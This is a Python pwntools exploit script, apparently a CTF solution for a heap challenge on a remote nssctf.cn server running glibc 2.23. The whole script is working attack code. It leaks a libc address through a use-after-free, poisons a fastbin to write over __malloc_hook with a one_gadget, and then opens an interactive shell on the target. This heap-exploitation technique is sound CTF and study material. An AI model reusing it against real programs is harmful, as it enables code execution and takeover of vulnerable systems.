from pwn import *
context.terminal=["tmux",'splitw','-h']
context.log_level = 'debug'
#io = gdb.debug('./heap')
io = remote('node4.anna.nssctf.cn',28035)
elf = ELF('./heap')
lib = ELF('/root/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/libc-2.23.so')

def create(idx,size):
    io.sendlineafter(b'>>',str(1))
    io.sendlineafter(b'?',str(idx))
    io.sendlineafter(b'?',str(size))

def delete(idx):
    io.sendlineafter(b'>>',str(2))
    io.sendlineafter(b'?',str(idx))

def show(idx):
    io.sendlineafter(b'>>',str(3))
    io.sendlineafter(b'?',str(idx))

def edit(idx,content):
    io.sendlineafter(b'>>',str(4))
    io.sendlineafter(b'?',str(idx))
    io.sendlineafter(b'content : \n',content)

create(0,400)   #0
create(1,10)    #1
delete(0)
show(0)
mallo_hook = u64(io.recvuntil(b'\n')[-7:-1].ljust(8,b'\x00'))-0x68
print(hex(mallo_hook))
delete(1)
lib_base = mallo_hook-lib.sym['__malloc_hook']
one_gadget = lib_base+0xf1247

create(2,0x60)
create(3,0x60)

delete(2)
delete(3)

edit(2,p64(mallo_hook-35))
create(4,0x60)
create(5,0x60)
create(6,0x60)
edit(6,cyclic(19)+p64(one_gadget))

create(7,0x60)
io.interactive()
